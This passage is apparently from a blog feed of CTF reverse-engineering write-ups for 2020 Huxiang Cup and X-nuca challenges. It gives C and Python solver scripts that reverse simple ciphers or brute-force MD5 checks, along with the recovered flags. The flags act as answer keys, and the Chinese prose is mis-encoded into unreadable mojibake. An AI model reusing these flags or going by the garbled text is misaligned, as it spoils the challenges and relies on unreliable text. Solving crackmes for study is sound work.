<span class="number">69</span> larl%r2,<span class="number">0x1071084</span> <span class="comment">// lea "you win"</span></span><br><span class="line"><span class="number">1000b</span>b8:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">18</span> brasl%r14,<span class="number">0x1008be8</span></span><br><span class="line"><span class="number">1000b</span>be:a7 f4 <span class="number">00</span> <span class="number">08</span>       j<span class="number">0x1000bce</span></span><br><span class="line"><span class="number">1000b</span>c2:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">66</span> larl%r2,<span class="number">0x107108e</span>   <span class="comment">//lea "you lose!"</span></span><br><span class="line"><span class="number">1000b</span>c8:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">10</span> brasl%r14,<span class="number">0x1008be8</span></span><br></pre></td></tr></table></figure><p>æå–å¤„æ•°æ®ï¼Œåœ¨gdbä¸­ä½¿ç”¨x/100xwæŸ¥çœ‹çš„æ•°æ®ç„¶åæå–å‡ºï¼ˆç›´æ¥æ‰¾åˆ°åœ°å€è®©hex.txtæ–‡ä»¶æ‰¾ä¹Ÿå¯ä»¥ï¼‰ã€‚</p><p>ç„¶åè§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> data[] = &#123; <span class="number">0x0000b2b0</span>, <span class="number">0x00006e72</span>, <span class="number">0x00006061</span>, <span class="number">0x0000565d</span>,</span><br><span class="line"><span class="number">0x0000942d</span>, <span class="number">0x0000ac79</span>, <span class="number">0x0000391c</span>, <span class="number">0x0000643d</span>,</span><br><span class="line"><span class="number">0x0000ec3f</span>, <span class="number">0x0000bd10</span>, <span class="number">0x0000c43e</span>, <span class="number">0x00007a65</span>,</span><br><span class="line"><span class="number">0x0000184b</span>, <span class="number">0x0000ef5b</span>, <span class="number">0x00005a06</span>, <span class="number">0x0000a8c0</span>,</span><br><span class="line"><span class="number">0x0000f64b</span>, <span class="number">0x0000c774</span>, <span class="number">0x000002ff</span>, <span class="number">0x00008e57</span>,</span><br><span class="line"><span class="number">0x0000aed9</span>, <span class="number">0x0000d8a9</span>, <span class="number">0x0000230c</span>, <span class="number">0x000074e8</span>,</span><br><span class="line"><span class="number">0x0000c2a6</span>, <span class="number">0x000088b3</span>, <span class="number">0x0000af2a</span>, <span class="number">0x00009ea7</span>,</span><br><span class="line"><span class="number">0x0000ce8a</span>, <span class="number">0x00005924</span>, <span class="number">0x0000d276</span>, <span class="number">0x000056d4</span>,</span><br><span class="line"><span class="number">0x000077d7</span>, <span class="number">0x0000990e</span>, <span class="number">0x0000b585</span>, <span class="number">0x00004bcd</span>,</span><br><span class="line"><span class="number">0x00005277</span>, <span class="number">0x00001afc</span>, <span class="number">0x00008c8a</span>, <span class="number">0x0000cdb5</span>,</span><br><span class="line"><span class="number">0x00006e26</span>, <span class="number">0x00004c22</span>, <span class="number">0x0000673f</span>, <span class="number">0x0000daff</span>,</span><br><span class="line"><span class="number">0x00000fac</span>, <span class="number">0x000086c7</span>, <span class="number">0x0000e048</span>, <span class="number">0x0000c483</span>,</span><br><span class="line"><span class="number">0x000085d3</span>, <span class="number">0x00002204</span>, <span class="number">0x0000c2ee</span>, <span class="number">0x0000e07f</span>,</span><br><span class="line"><span class="number">0x00000caf</span>, <span class="number">0x0000bf76</span>, <span class="number">0x000063fe</span>, <span class="number">0x0000bffb</span>,</span><br><span class="line"><span class="number">0x00004b09</span>, <span class="number">0x0000e5b3</span>, <span class="number">0x00008bda</span>, <span class="number">0x000096df</span>,</span><br><span class="line"><span class="number">0x0000866d</span>, <span class="number">0x00001719</span>, <span class="number">0x00006bcf</span>, <span class="number">0x0000adcc</span>,</span><br><span class="line"><span class="number">0x00000f2b</span>, <span class="number">0x000051ce</span>, <span class="number">0x00001549</span>, <span class="number">0x000020c1</span>,</span><br><span class="line"><span class="number">0x00003a8d</span>, <span class="number">0x000005f5</span>, <span class="number">0x00005403</span>, <span class="number">0x00001125</span>,</span><br><span class="line"><span class="number">0x00009161</span>, <span class="number">0x0000e2a5</span>, <span class="number">0x00005196</span>, <span class="number">0x0000d8d2</span>,</span><br><span class="line"><span class="number">0x0000d644</span>, <span class="number">0x0000ee86</span>, <span class="number">0x00003896</span>, <span class="number">0x00002e71</span>,</span><br><span class="line"><span class="number">0x0000a6f1</span>, <span class="number">0x0000dfcf</span>, <span class="number">0x00003ece</span>, <span class="number">0x00007d49</span>,</span><br><span class="line"><span class="number">0x0000c24d</span>, <span class="number">0x0000237e</span>, <span class="number">0x00009352</span>, <span class="number">0x00007a97</span>,</span><br><span class="line"><span class="number">0x00007bfa</span>, <span class="number">0x0000cbaa</span>, <span class="number">0x000010dc</span>, <span class="number">0x00003bd9</span>,</span><br><span class="line"><span class="number">0x00007d7b</span>, <span class="number">0x00003b88</span>, <span class="number">0x0000b0d0</span>, <span class="number">0x0000e8bc</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> result[] = &#123; <span class="number">0x08a73233</span>, <span class="number">0x116db0f6</span>, <span class="number">0x0e654937</span>, <span class="number">0x03c374a7</span>,</span><br><span class="line"><span class="number">0x16bc8ed9</span>, <span class="number">0x0846b755</span>, <span class="number">0x08949f47</span>, <span class="number">0x04a13c27</span>,</span><br><span class="line"><span class="number">0x0976cf0a</span>, <span class="number">0x07461189</span>, <span class="number">0x1e1a5c12</span>, <span class="number">0x11e64d96</span>,</span><br><span class="line"><span class="number">0x03cf09b3</span>, <span class="number">0x093cb610</span>, <span class="number">0x0d41ea64</span>, <span class="number">0x07648050</span>,</span><br><span class="line"><span class="number">0x092039bf</span>, <span class="number">0x08e7f1f7</span>, <span class="number">0x004d871f</span>, <span class="number">0x1680f823</span>,</span><br><span class="line"><span class="number">0x06f3c3eb</span>, <span class="number">0x2205134d</span>, <span class="number">0x015c6a7c</span>, <span class="number">0x11c67ed0</span>,</span><br><span class="line"><span class="number">0x0817b32e</span>, <span class="number">0x06bd9b92</span>, <span class="number">0x08806b0c</span>, <span class="number">0x06aaa515</span>,</span><br><span class="line"><span class="number">0x205b9f76</span>, <span class="number">0x0de963e9</span>, <span class="number">0x2194e8e2</span>, <span class="number">0x047593bc</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> input = <span class="number">0x20</span>; input &lt; <span class="number">0x7e</span>; input++)</span><br><span class="line">&#123;</span><br><span class="line">a = input*input*data[i]+ data[i + <span class="number">32</span>] * input+ data[i + <span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a == result[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, input);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//8eb5d8b632dae2a5167e3e1c4884eef9</span></span><br></pre></td></tr></table></figure><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>ç›´æ¥æ‹–å…¥idaåˆ†æå®Œmainå‡½æ•°åæ²¡æœ‰å‘ç°åŠ å¯†åˆ¤æ–­å‡½æ•°ï¼Œç›´æ¥åŠ¨è°ƒè·Ÿæµç¨‹ï¼Œä¹Ÿå¾ˆç®€å•ï¼Œæ•´ç†äº†ä¸‹åŠ å¯†ä¸æœ€åæ¯”è¾ƒæ•°æ®çš„ç¬”è®°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a = input[<span class="number">0</span>] &lt;&lt; <span class="number">3</span></span><br><span class="line">b = input[<span class="number">1</span>] &gt;&gt; <span class="number">5</span></span><br><span class="line">a = a|b</span><br><span class="line">a = a ^ i;</span><br><span class="line"></span><br><span class="line">input[i] = (input[i] &lt;&lt; <span class="number">3</span>) | (input[(i+<span class="number">1</span>)%<span class="number">24</span>] &amp; <span class="number">0xE0</span>) &gt;&gt; <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">43</span>,   <span class="number">8</span>, <span class="number">169</span>, <span class="number">200</span>, <span class="number">151</span>,  <span class="number">47</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">146</span>, <span class="number">240</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">137</span>, <span class="number">247</span>,  <span class="number">38</span>,   <span class="number">7</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">234</span>, <span class="number">179</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">239</span>, <span class="number">220</span>, <span class="number">149</span>, <span class="number">171</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">sar:ç®—æœ¯å³ç§»æŒ‡ä»¤ã€‚å³ç§»æ—¶ä¿ç•™æ“ä½œæ•°çš„ç¬¦å·ï¼Œå³ç”¨ç¬¦å·ä½æ¥è¡¥è¶³ã€‚</span><br><span class="line">shr:é€»è¾‘å³ç§»æŒ‡ä»¤ã€‚å³ç§»æ—¶æ€»æ˜¯ç”¨<span class="number">0</span>æ¥è¡¥è¶³ã€‚</span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">43</span>,   <span class="number">8</span>, <span class="number">169</span>, <span class="number">200</span>, <span class="number">151</span>,  <span class="number">47</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">146</span>, <span class="number">240</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">137</span>, <span class="number">247</span>,  <span class="number">38</span>,   <span class="number">7</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">234</span>, <span class="number">179</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">239</span>, <span class="number">220</span>, <span class="number">149</span>, <span class="number">171</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ch1 = <span class="number">0</span>;</span><br><span class="line">ch1 = (ida_chars[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) | (ida_chars[<span class="number">23</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">23</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ch1 = (((ida_chars[i]^i) &gt;&gt; <span class="number">3</span>) | ((ida_chars[i<span class="number">-1</span>]^(i<span class="number">-1</span>)) &lt;&lt; <span class="number">5</span>))&amp;<span class="number">0xff</span>;</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line">&#125;</span><br><span class="line">ch1 = (ida_chars[<span class="number">23</span>] &gt;&gt; <span class="number">3</span> ) | ((ida_chars[<span class="number">22</span>]^<span class="number">22</span>) &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="built_in">putchar</span>(ch1);</span><br><span class="line"><span class="comment">//ea5yre_1s_50_ea5y_t0_y0u</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h3><p>å¾ˆç®€å•ï¼Œidaæ‰“å¼€åç®€å•åˆ†æä»¥ä¸‹ï¼Œåªæ˜¯å¯¹è¾“å…¥è¿›è¡Œäº†ä¸€ä¸ªå¼‚æˆ–ï¼Œç„¶åä¸æŒ‡å®šç¼–ç å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒã€‚ã€‚</p><p>ç›´æ¥åœ¨ida-pythonè§£å†³ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'7d21e&lt;e3&lt;:3;9;ji t r#w\"$*&#123;*+*$|,'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    flag += chr(ord(s[i])^i)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#7e02a9c4439056df0e2a7b432b0069b3</span></span><br></pre></td></tr></table></figure><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>é¦–å…ˆä»ç¨‹åºå›¾æ ‡å¯ä»¥æƒ³åˆ°pythonï¼Œç„¶åidaè½½å…¥æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå‘ç°å¾ˆå¤šPYç›¸å…³çš„å­—ç¬¦ä¸”ç¨‹åºä¸å¯»å¸¸ã€‚è¿™æ—¶å€™åŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯pythonæ‰“åŒ…æˆçš„exeç¨‹åºäº†ã€‚</p><p>ç„¶åä½¿ç”¨<strong>python pyinstxtractor.py ReMe.exe</strong>è§£åŒ…ï¼Œä»å¾—åˆ°çš„åŒ…é‡Œå¯ä»¥pycæ–‡ä»¶çœ‹åˆ°ReMeï¼Œä½†æ˜¯ç¼ºå°‘æ–‡ä»¶å¤´çš„ï¼Œæ‰¾åˆ°åŒ…é‡Œçš„å¦ä¸€ä¸ªstuctæ–‡ä»¶ï¼Œå¯¹ReMeçš„æ–‡ä»¶å¤´è¿›è¡Œè¡¥é½ã€‚</p><p><img src="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/909254_VRZ57MQQAC3H4EX.png" alt="https://bbs.pediy.com/upload/attach/202011/909254_VRZ57MQQAC3H4EX.png"></p><p>ä½¿ç”¨<strong>uncompyle6 -o re.py ReMe.pyc</strong>è½¬åŒ–ä¸ºpyæ–‡ä»¶ã€‚</p><p>pyä»£ç å¾ˆç®€å•ï¼ŒæŠŠåŸæ¥çš„ä»£ç ç¨å¾®ä¿®æ”¹ä»¥ä¸‹å¯ä»¥ç›´æ¥çˆ†ç ´å‡ºflagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hashlib</span><br><span class="line">check = [</span><br><span class="line"> <span class="string">'e5438e78ec1de10a2693f9cffb930d23'</span>,</span><br><span class="line"> <span class="string">'08e8e8855af8ea652df54845d21b9d67'</span>,</span><br><span class="line"> <span class="string">'a905095f0d801abd5865d649a646b397'</span>,</span><br><span class="line"> <span class="string">'bac8510b0902185146c838cdf8ead8e0'</span>,</span><br><span class="line"> <span class="string">'f26f009a6dc171e0ca7a4a770fecd326'</span>,</span><br><span class="line"> <span class="string">'cffd0b9d37e7187483dc8dd19f4a8fa8'</span>,</span><br><span class="line"> <span class="string">'4cb467175ab6763a9867b9ed694a2780'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'cffd0b9d37e7187483dc8dd19f4a8fa8'</span>,</span><br><span class="line"> <span class="string">'fd311e9877c3db59027597352999e91f'</span>,</span><br><span class="line"> <span class="string">'49733de19d912d4ad559736b1ae418a7'</span>,</span><br><span class="line"> <span class="string">'7fb523b42413495cc4e610456d1f1c84'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'acb465dc618e6754de2193bf0410aafe'</span>,</span><br><span class="line"> <span class="string">'bc52c927138231e29e0b05419e741902'</span>,</span><br><span class="line"> <span class="string">'515b7eceeb8f22b53575afec4123e878'</span>,</span><br><span class="line"> <span class="string">'451660d67c64da6de6fadc66079e1d8a'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'fe86104ce1853cb140b7ec0412d93837'</span>,</span><br><span class="line"> <span class="string">'acb465dc618e6754de2193bf0410aafe'</span>,</span><br><span class="line"> <span class="string">'c2bab7ea31577b955e2c2cac680fb2f4'</span>,</span><br><span class="line"> <span class="string">'8e50684ac9ef90dfdc6b2e75f2e23741'</span>,</span><br><span class="line"> <span class="string">'f077b3a47c09b44d7077877a5aff3699'</span>,</span><br><span class="line"> <span class="string">'620741f57e7fafe43216d6aa51666f1d'</span>,</span><br><span class="line"> <span class="string">'9e3b206e50925792c3234036de6a25ab'</span>,</span><br><span class="line"> <span class="string">'49733de19d912d4ad559736b1ae418a7'</span>,</span><br><span class="line"> <span class="string">'874992ac91866ce1430687aa9f7121fc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(num)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        num = num * <span class="number">3</span> + <span class="number">1</span> <span class="keyword">if</span> num % <span class="number">2</span> <span class="keyword">else</span> num // <span class="number">2</span></span><br><span class="line">        result.append(num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">ret_list = func(ch)</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> range(len(ret_list)):</span><br><span class="line">s += str(ret_list[idx])</span><br><span class="line">s += str(ret_list[(len(ret_list) - idx - <span class="number">1</span>)])</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(s.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">if</span> md5.hexdigest() == check[i]:</span><br><span class="line">flag += chr(ch)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">   print(<span class="string">'flag&#123;'</span> + md5.hexdigest() + <span class="string">'&#125;'</span>)</span><br><span class="line">    </span><br><span class="line">   <span class="comment">#flag&#123;0584cfa2ce502951ef5606f6b99fc921&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ€»çš„æ¥è¯´è¿™æ¬¡çš„reéƒ½è¿˜å¥½ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>X-nuca 2020</title>
    <link href="https://www.bxnop.cn/2020/10/31/X-nuca-2020/"/>
    <id>https://www.bxnop.cn/2020/10/31/X-nuca-2020/</id>
    <published>2020-10-31T10:06:17.000Z</published>
    <updated>2020-12-13T15:13:16.080Z</updated>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡æ‰“è¿™ä¸ªæ¯”èµ›ï¼Œé¢˜ç›®éƒ½åéš¾å§ã€‚ã€‚åšäº†ä¸€ä¸ªarmæ¶æ„çš„é¢˜ï¼Œç„¶åUnravelMFCè¿™ä¸ªé¢˜ï¼Œæ¯”èµ›æ—¶å­¦é•¿å¸ˆå‚…åšäº†ï¼Œå°±æ²¡åšäº†ï¼Œèµ›åæŠŠå®ƒå¤ç°äº†ä¸‹ã€‚</p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A" target="_blank" rel="noopener">https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A</a><br>æå–ç ï¼šmflo<br>å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦</p><a id="more"></a><h1 id="babyarm"><a href="#babyarm" class="headerlink" title="babyarm"></a>babyarm</h1><p>è¿›å…¥ç¨‹åºç›´æ¥çœ‹åˆ°å‡çš„ç¨‹åºæµç¨‹ã€‚ã€‚çœ‹äº†ä¸‹å‡½æ•°ï¼Œç„¶ågdbå¼€ä¸€ä¸ªç«¯å£ä¸æ–­è°ƒè¯•è·Ÿæ‰¾åˆ°å…³é”®å‡½æ•°ã€‚å…¶å®ä»<strong>ELF Initialization Function Table</strong> ä¹Ÿå¯ä»¥çœ‹è§å…³é”®åŠ å¯†å‡½æ•°ï¼š<strong>sub_114D8</strong>ã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201105163344611.png" alt="image-20201105163344611"></p><p>ç¡®å®šå…³é”®å‡½æ•°åä¸æ–­è°ƒè¯•ã€‚ã€‚ä»è°ƒè¯•çœ‹åˆ°ï¼Œé¦–å…ˆå¯¹è¾“å…¥å­—ç¬¦hexï¼Œç„¶åå†byes.fromhex()ï¼Œæ‰€ä»¥æœ€åå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ã€‚</p><p>å‰©ä¸‹å°±æ˜¯æ…¢æ…¢æ•´ç†æ•°æ®ï¼Œè§£å¯†ã€‚ã€‚å¾ªç¯åŠ å¯†æ•°æ®ã€‚ã€‚</p><p>åŠ å¯†ä¸­2ä¸­å–å·²ç»ç¼–ç æ•°æ®çš„è¡¨è¾¾å¼éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼ŒåŠ¨è°ƒå¯ä»¥å¾ˆæ˜ç™½ã€‚</p><p><strong>(_DWORD *)(&amp;v40 + (v17 &amp; 0xC) - 20)</strong></p><p><strong>(*((_DWORD *)&amp;v40 + (((unsigned __int8)(v17 &gt;&gt; 2) ^ 1) &amp; 3) - 5)</strong></p><p>é¦–å…ˆå–å‡ºæœ€åæ¯”è¾ƒçš„å¯†æ–‡å˜æˆ16ä¸ª4å­—èŠ‚æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0xF0</span>, <span class="number">0x61</span>, <span class="number">0xB0</span>, <span class="number">0x7E</span>, <span class="number">0x56</span>, <span class="number">0xC8</span>, <span class="number">0xB3</span>, <span class="number">0xC7</span>, <span class="number">0xA3</span>, </span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0x99</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x1C</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x22</span>, <span class="number">0xE3</span>, <span class="number">0x3E</span>, </span><br><span class="line">  <span class="number">0x3E</span>, <span class="number">0x2B</span>, <span class="number">0xE2</span>, <span class="number">0xE3</span>, <span class="number">0x50</span>, <span class="number">0xA2</span>, <span class="number">0xE5</span>, <span class="number">0x43</span>, <span class="number">0xD0</span>, <span class="number">0x8E</span>, </span><br><span class="line">  <span class="number">0xB2</span>, <span class="number">0x59</span>, <span class="number">0xDC</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x0F</span>, <span class="number">0x83</span>, <span class="number">0xD0</span>, <span class="number">0xF4</span>, <span class="number">0x9B</span>, </span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x81</span>, <span class="number">0x57</span>, <span class="number">0x8A</span>, <span class="number">0x4F</span>, <span class="number">0xEC</span>, <span class="number">0x04</span>, <span class="number">0x86</span>, <span class="number">0x7F</span>, <span class="number">0xA2</span>, </span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x2E</span>, <span class="number">0xF3</span>, <span class="number">0xDD</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x53</span>, <span class="number">0xB2</span>, <span class="number">0xC9</span>, <span class="number">0x93</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x8E</span>, <span class="number">0x7F</span>, <span class="number">0xDC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span 